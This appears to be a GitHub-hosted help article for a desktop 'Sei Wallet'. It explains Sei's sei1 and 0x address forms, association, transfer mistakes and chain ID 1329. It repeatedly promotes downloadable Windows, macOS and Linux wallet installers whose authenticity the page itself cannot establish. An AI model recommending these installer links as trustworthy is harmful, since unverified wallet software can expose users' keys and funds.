![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">sei1 and 0x addresses in Sei Wallet: which one to use</h1>

<p align="center">One account, two address forms, and which one to hand to whom.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Sei gives every account two addresses derived from the same key: a `0x...` EVM address and a `sei1...` address in the older Cosmos format. They are two views of one account, but they are not interchangeable until the account is associated, and sending to the wrong form is the most common way people convince themselves their funds have vanished.

The short version: use `0x` for almost everything on Sei today, use `sei1` only where something specifically asks for it, and check association before you move a balance. If you are new to the product rather than the addresses, start with [what Sei Wallet is](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Why one key produces two addresses

Sei runs an EVM chain alongside what remains of its Cosmos heritage. The same private key can be interpreted under either address scheme, so the wallet derives both. The `0x` form is what EVM tooling understands: contracts, dApps, block explorers built for Ethereum-style addresses. The `sei1` form is the older bech32 representation that Cosmos wallets and some exchanges still recognise.

Neither address is "the real one". They are the same account wearing two labels, and the account - not the label - holds the balance.

## What association actually does

Until an account is associated, the two address spaces behave independently: funds sent to the `0x` form are not visible through the `sei1` form, and the reverse is also true. Association links them, and on Sei it happens when the account first signs an EVM transaction or calls the address-association precompile.

That single fact explains a whole category of support threads: a user moves SEI to the `0x` address, opens a wallet showing the `sei1` address, sees a zero balance, and concludes the transfer failed. Nothing failed. They are looking at the other side of an unassociated account.

The practical consequence is worth stating plainly: **before you receive a large amount, do a small test transfer and confirm it appears where you expect**. It costs a transaction fee and removes the guesswork.

## Which address to give someone

<div align="center">

| Situation | Address to use |
|---|---|
| A dApp, contract or EVM wallet asks for your address | `0x...` |
| A Sei-native app that shows a `sei1...` field | `sei1...`, but confirm it resolves to the same account |
| An exchange withdrawal form | Whatever form its network selector implies - and read the network name, not just the address |
| Someone sending you SEI from another Sei wallet | `0x...`, the form most current wallets display |

</div>

If a sender insists on a format your wallet does not show, do not improvise a conversion. Ask them to send a small test amount first, and check both views before the rest.

## Where to find each address in the app

Most desktop wallets show the active account's address at the top of the main screen, with a copy control and a QR code. Switching between the `0x` and `sei1` views is usually a network or account selector rather than a separate screen. The exact locations are in [finding your Sei Wallet address](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md).

If you have more than one account in the wallet, check which one is selected before copying anything. A copied address from the wrong account is indistinguishable from a correct one until the funds land somewhere else.

## The mistakes that look like losses

**Sending to the other format.** The classic. The transaction succeeds, the destination wallet shows nothing, and the sender believes the funds are gone. They are usually in the same account, visible once you switch views or associate.

**Sending to a testnet address.** Testnet addresses use the same shape as mainnet ones. A mainnet transfer to a testnet address is a mainnet transfer to an address nobody controls - this one genuinely is not recoverable, which is why the network name matters more than the address format.

**Copying an address from a block explorer.** Explorers show both forms; copying the wrong column is easy and silent. Copy from the wallet you are sending to, or from the recipient directly.

**Assuming an old address is dead.** After migration between wallets, the same key often produces the same `0x` address but a different `sei1` one, depending on the derivation the wallet uses. That is a derivation question rather than an association one, and it is worth understanding before you import the same seed into a second wallet.

## What changed when Sei went EVM-first

Sei's development has moved to EVM, and the Cosmos-side smart contract tooling has been deprecated. For a wallet user, the practical effect is that new applications expect `0x`, and `sei1` survives mainly for compatibility with older accounts and with services that still index that form.

This is also why read-only support for legacy `sei1` addresses is a reasonable design: you may need to see an old balance without expecting to transact from it. If your wallet shows a `sei1` balance it will not let you spend, that is the intended behaviour rather than a bug.

## Chain ID, and why it comes up here

Adding Sei to an EVM wallet means entering the network's chain ID, its RPC endpoint and its currency symbol. The mainnet ID is 1329, written `0x531` in hexadecimal; testnet is 1328. If those numbers are wrong, the wallet will show an empty account even though the address is correct - a different failure with the same symptom as an unassociated address.

The full setup, including what each field does, is in [chain ID 1329 and Sei network settings](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md), and the wallet-side steps for MetaMask are in [adding Sei to MetaMask](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md).

## What about Rabby, Phantom and other EVM wallets?

Any EVM wallet that lets you add a custom network can hold SEI at a `0x` address. What varies is whether the wallet knows about Sei's explorer, whether it handles the native currency correctly, and whether it shows you the `sei1` view at all. The trade-offs are in [Sei in Rabby, Phantom and other EVM wallets](https://github.com/sei-chain/sei-wallet-setup/blob/main/use-rabby-phantom-or-a-desktop-app.md).

## If a transfer already looks wrong

Do not send a second transfer to "fix" the first. Check three things in order: the sending transaction on a Sei explorer, the receiving address you actually typed, and which address view the destination wallet is showing. If the transaction is confirmed and the address matches, the funds are in an account - the question is which view displays it. [stuck transactions](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) covers the cases where the transaction itself has not settled.

## Frequently asked questions

**Is Sei an EVM blockchain?** Yes. Sei runs an EVM chain, which is why `0x` addresses and EVM tooling work on it.

**Is SEI an ERC-20 token?** The native asset is not an ERC-20; it is the chain's own currency. Tokens on Sei can follow ERC-20 conventions, which is a different thing.

**Is Sei on Ethereum?** No. Sei is a separate chain with its own chain ID. Bridging moves assets between them rather than making them the same network.

**What is Sei v2?** The name used through Sei's EVM transition. In wallet terms, what matters is that the current network is EVM-first, not which version number a page uses.

**Can I convert a sei1 address into a 0x address?** They are derived from the same key rather than converted, and the link between them is the on-chain association. A "converter" that asks for your seed phrase is a theft attempt, not a tool.

**Which address should I give an exchange?** The one its withdrawal form expects, with the network name checked as carefully as the address. When in doubt, withdraw a small amount first.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Where to find your Sei Wallet address](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md)
- [Chain ID 1329 and the Sei network settings in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md)
- [Add Sei to MetaMask, or use a Sei wallet instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md)
